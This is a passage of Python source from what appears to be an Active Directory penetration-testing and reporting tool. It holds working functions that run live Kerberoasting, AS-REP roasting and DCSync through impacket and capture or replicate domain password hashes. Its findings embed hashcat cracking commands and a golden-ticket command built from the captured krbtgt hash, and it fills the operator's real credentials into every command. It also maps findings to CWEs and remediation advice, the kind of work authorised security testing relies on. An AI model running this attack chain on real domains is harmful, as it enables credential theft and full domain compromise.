    DOMAIN\\user:RID:LM:NT::: -> {principal, rid, nt, krbtgt(bool)}."""
    out = []
    for line in output.splitlines():
        line = line.strip()
        m = re.match(r"^([^:\s]+):(\d+):([0-9a-fA-F]{32}):([0-9a-fA-F]{32}):::", line)
        if not m:
            continue
        principal, rid, nt = m.group(1), m.group(2), m.group(4)
        out.append({"principal": principal, "rid": rid, "nt": nt,
                    "krbtgt": principal.split("\\")[-1].lower() == "krbtgt"
                    or rid == "502"})
    return out


def live_kerberoast(creds: dict, privileged: set | None = None) -> dict:
    """Run impacket-GetUserSPNs -request and capture every TGS-REP hash.
    Returns {ran, tool, command, output, hashes, findings, error}."""
    privileged = {p.upper() for p in (privileged or set())}
    tool = _kerb_tool("impacket-GetUserSPNs", "GetUserSPNs.py")
    if not tool:
        return {"ran": False, "error": "impacket-GetUserSPNs not installed",
                "hashes": [], "findings": []}
    target, flags = _impacket_target(creds)
    dc = creds.get("dc_ip") or ""
    cmd = [tool, "-request", "-outputfile", "-"] + flags
    if dc:
        cmd += ["-dc-ip", dc]
    cmd.append(target)
    out, err = _run(cmd)
    if err:
        return {"ran": True, "tool": tool, "command": " ".join(cmd), "output": out,
                "hashes": [], "findings": [], "error": err}
    hashes = parse_tgs(out)
    fs = []
    for h in hashes:
        priv = h["user"].upper() in privileged
        fs.append(_finding(
            "roasted", "critical" if priv else "high",
            "Kerberoast hash captured (proven)"
            + (" - privileged account" if priv else ""),
            h["user"], "",
            f"Captured a live TGS-REP for SPN '{h['spn']}' by requesting a service "
            f"ticket as {creds.get('user') or 'the supplied user'} - proof the account "
            "is roastable. Crack it offline to recover the plaintext service-account "
            f"password.\n\n{h['hash']}",
            "hashcat",
            "hashcat -m 13100 kerberoast.hash rockyou.txt   # captured hash saved to "
            "loot/kerberoast.hash",
            "Use a long random gMSA/managed password; minimise SPNs on user accounts."))
    return {"ran": True, "tool": tool, "command": " ".join(cmd), "output": out,
            "hashes": hashes, "findings": fs, "error": None}


def live_asrep(creds: dict) -> dict:
    """Run impacket-GetNPUsers -request (authenticated) and capture AS-REP hashes for
    every DONT_REQ_PREAUTH account. Returns the same shape as live_kerberoast."""
    tool = _kerb_tool("impacket-GetNPUsers", "GetNPUsers.py")
    if not tool:
        return {"ran": False, "error": "impacket-GetNPUsers not installed",
                "hashes": [], "findings": []}
    target, flags = _impacket_target(creds)
    dc = creds.get("dc_ip") or ""
    cmd = [tool, "-request", "-format", "hashcat"] + flags
    if dc:
        cmd += ["-dc-ip", dc]
    cmd.append(target)
    out, err = _run(cmd)
    if err:
        return {"ran": True, "tool": tool, "command": " ".join(cmd), "output": out,
                "hashes": [], "findings": [], "error": err}
    hashes = parse_asrep(out)
    fs = []
    for h in hashes:
        fs.append(_finding(
            "asreproasted", "high",
            "AS-REP hash captured (proven)", h["user"], "",
            f"Captured a live AS-REP for {h['user']} (no Kerberos pre-auth required), "
            "proving the account is AS-REP-roastable. Crack it offline for the "
            f"plaintext password.\n\n{h['hash']}",
            "hashcat",
            "hashcat -m 18200 asrep.hash rockyou.txt   # captured hash saved to "
            "loot/asrep.hash",
            "Require Kerberos pre-authentication on the account."))
    return {"ran": True, "tool": tool, "command": " ".join(cmd), "output": out,
            "hashes": hashes, "findings": fs, "error": None}


def live_dcsync(creds: dict) -> dict:
    """Run impacket-secretsdump -just-dc to replicate the domain's NTLM hashes.
    Returns {ran, tool, command, output, hashes, findings, error}; hashes is the full
    NTLM list and findings summarises the domain compromise (krbtgt = golden ticket)."""
    tool = _kerb_tool("impacket-secretsdump", "secretsdump.py")
    if not tool:
        return {"ran": False, "error": "impacket-secretsdump not installed",
                "hashes": [], "findings": []}
    target, flags = _impacket_target(creds, at_dc=True)
    dc = creds.get("dc_ip") or ""
    cmd = [tool, "-just-dc"] + flags
    if dc:
        cmd += ["-dc-ip", dc]
    cmd.append(target)
    out, err = _run(cmd, timeout=600)
    if err:
        return {"ran": True, "tool": tool, "command": " ".join(cmd), "output": out,
                "hashes": [], "findings": [], "error": err}
    hashes = parse_secretsdump(out)
    fs = []
    if hashes:
        krb = next((h for h in hashes if h["krbtgt"]), None)
        detail = (f"DCSync succeeded: replicated {len(hashes)} account hash(es) from the "
                  "domain via the Directory Replication Service - proof the supplied "
                  "account holds DS-Replication rights (domain compromise). ")
        if krb:
            detail += ("The krbtgt hash is included, enabling golden-ticket persistence:\n\n"
                       f"krbtgt NT: {krb['nt']}\n\nimpacket-ticketer -nthash "
                       f"{krb['nt']} -domain-sid <sid> -domain {creds.get('domain') or '<dom>'} "
                       "Administrator")
        fs.append(_finding(
            "dcsynced", "critical", "DCSync succeeded - domain hashes replicated (proven)",
            creds.get("user") or "you", creds.get("domain") or "",
            detail, "impacket-secretsdump", " ".join(cmd),
            "Restrict DS-Replication-Get-Changes/-All to Domain Controllers only; audit "
            "who holds these rights off tier-0. Rotate krbtgt twice if replicated."))
    return {"ran": True, "tool": tool, "command": " ".join(cmd), "output": out,
            "hashes": hashes, "findings": fs, "error": None}


def live_kerberos(creds: dict, graph: dict | None = None, do_roast: bool = False,
                  do_asrep: bool = False, do_dcsync: bool = False) -> dict:
    """Orchestrate the opted-in live Kerberos captures. Returns
    {findings, runs, errors} where `runs` holds each tool's raw result (for loot
    files + proof screenshots) and `findings` are the proven captures to fold into
    the main analysis."""
    privileged = set()
    if graph:
        for f in findings(graph):
            if f["category"] == "kerberoast" and f["severity"] == "high":
                privileged.add(f["principal"])
    runs, out_findings, errors = {}, [], []
    if do_roast:
        r = live_kerberoast(creds, privileged)
        runs["kerberoast"] = r
        out_findings.extend(r.get("findings", []))
        if r.get("error"):
            errors.append(f"kerberoast: {r['error']}")
    if do_asrep:
        r = live_asrep(creds)
        runs["asrep"] = r
        out_findings.extend(r.get("findings", []))
        if r.get("error"):
            errors.append(f"asrep: {r['error']}")
    if do_dcsync:
        r = live_dcsync(creds)
        runs["dcsync"] = r
        out_findings.extend(r.get("findings", []))
        if r.get("error"):
            errors.append(f"dcsync: {r['error']}")
    return {"findings": out_findings, "runs": runs, "errors": errors}


# --- credential substitution ----------------------------------------------------

def fill_creds(analysis: dict, creds: dict | None) -> dict:
    """Substitute the operator's real credentials into every generated command so
    they are copy-paste ready. Password engagements (the common case) get -u/-p/-d
    and the DC IP filled; placeholders with no value are left intact. Mutates and
    returns `analysis`."""
    creds = creds or {}
    dom = creds.get("domain") or ""
    user = creds.get("user") or ""
    secret = creds.get("secret") or ""
    dc = creds.get("dc_ip") or ""
    is_hash = creds.get("is_hash")
    # Longest / composite tokens first so partial tokens don't clobber them.
    subs: list[tuple[str, str]] = []
    if dom and user:
        subs.append(("<user>@<DOMAIN>", f"{user}@{dom}"))
        if secret and not is_hash:
            subs.append(("<DOMAIN>/<user>:<pass>", f"{dom}/{user}:{secret}"))
        subs.append(("<DOMAIN>/<user>", f"{dom}/{user}"))
    if user:
        subs.append(("<user>", user))
        subs.append(("<you>", user))
    if secret and not is_hash:
        subs.append(("<pass>", secret))
    if is_hash and secret:
        subs.append((":<nt>", f":{secret}"))
        subs.append(("-hashes :<nt>", f"-hashes :{secret}"))
    if dom:
        subs.append(("<DOMAIN>", dom))
        subs.append(("<dom>", dom))
    if dc:
        subs.append(("<dc-ip>", dc))
        subs.append(("<dc>", dc))

    # Single left-to-right pass (longest token first) so a value that happens to
    # contain another token - e.g. a password literally "<dc>" - is never re-scanned.
    mapping = dict(subs)
    pattern = re.compile("|".join(re.escape(t) for t in
                                  sorted(mapping, key=len, reverse=True))) if mapping else None

    def apply(text):
        if pattern is None or not isinstance(text, str):
            return text
        return pattern.sub(lambda m: mapping[m.group(0)], text)

    for f in analysis.get("findings", []):
        f["command"] = apply(f.get("command", ""))
    for a in analysis.get("kerberos", []):
        a["command"] = apply(a.get("command", ""))
    for p in analysis.get("paths", []):
        for st in p.get("steps", []):
            st["abuse"] = apply(st.get("abuse", ""))
    return analysis


# --- top-level analysis ---------------------------------------------------------

# AD finding category -> CWE(s). Every id here is already classified in
# report_docx (so writeups + the CWE-coverage test stay green). ADCS ESCx ->
# privilege escalation via certificate abuse (CWE-269).
_CATEGORY_CWE = {
    "kerberoast": ["CWE-262"], "asrep": ["CWE-262"], "dcsync": ["CWE-269"],
    "delegation": ["CWE-266"], "rbcd": ["CWE-266"], "shadowcred": ["CWE-287"],
    "acl": ["CWE-732"], "creds": ["CWE-522"], "hygiene": ["CWE-521"],
    # live captures (proven) reuse the same CWE classes as their staged counterparts.
    "roasted": ["CWE-262"], "asreproasted": ["CWE-262"], "dcsynced": ["CWE-269"],
}


def findings_to_vulns(analysis: dict, ip: str, hostname: str = "") -> list:
    """Convert the AD findings into first-class Vuln objects (attached to the DC /
    domain host) so they feed the main severity totals, the Vulnerabilities sheet,
    and the per-finding writeups - not just the AD-only sheets. Each keeps its
    exact prove/abuse command as evidence."""
    from .models import Vuln
    out = []
    for f in analysis.get("findings", []):
        cat = f["category"]
        cwes = ["CWE-269"] if cat.startswith("adcs-") else \
            _CATEGORY_CWE.get(cat, ["CWE-284"])
        who = f.get("principal") or ""
        tgt = f.get("target") or ""
        evidence = f.get("detail") or ""
        if who or tgt:
            evidence += f"\n\nPrincipal: {who}" + (f"  ->  {tgt}" if tgt else "")
        if f.get("command"):
            evidence += f"\n\nProve / abuse:\n{f['command']}"
        # script_id carries the principal/target so Vuln.key is UNIQUE per finding
        # (distinct kerberoastable users, ESC templates, ... aren't deduped away in
        # the main totals) - while the generic title still lets group_findings
        # aggregate them into a single writeup that lists every affected principal.
        out.append(Vuln(
            ip=ip, port=None, protocol="tcp",
            script_id=f"ad-{cat}:{who}|{tgt}"[:80], state="finding", title=f["title"],
            severity=f["severity"], source="adcs" if cat.startswith("adcs-") else "bloodhound",
            confidence="confirmed", cwes=list(cwes),
            output=evidence.strip(), remediation=f.get("remediation", "")))
    return out


def empty_analysis() -> dict:
    """A base analysis dict for when there is no SharpHound graph (e.g. only a
    Certipy ADCS import). Findings get merged in by the caller."""
    return {"stats": {"nodes": 0, "edges": 0, "by_type": {}, "findings": 0, "paths": 0},
            "findings": [], "paths": [], "kerberos": [], "domains": [],
            "architecture": {"nodes": {}, "edges": [], "trusts": [], "truncated": False}}


def analyze(path: str, owned: set[str] | None = None,
            creds: dict | None = None) -> dict:
    """Full analysis of a SharpHound collection. Returns a JSON-serialisable dict:
        {stats, findings, paths, kerberos, domains}."""
    graph = load_graph(path)
    fs = findings(graph)
    paths = attack_paths(graph, owned)
    kerb = kerberos_actions(graph, creds) if creds else []
    types: dict[str, int] = {}
    for node in graph["nodes"].values():
        types[node["type"]] = types.get(node["type"], 0) + 1
    doms = [{"sid": s, "name": p.get("name", s),
             "functionallevel": p.get("functionallevel", ""),
             "machineaccountquota": p.get("machineaccountquota", ""),
             "trusts": p.get("_trusts", [])}
            for s, p in graph["domains"].items()]
    return {
        "stats": {"nodes": len(graph["nodes"]), "edges": len(graph["edges"]),
                  "by_type": types,
                  "findings": len(fs), "paths": len(paths)},
        "findings": fs, "paths": paths, "kerberos": kerb, "domains": doms,
        "architecture": architecture(graph),
    }
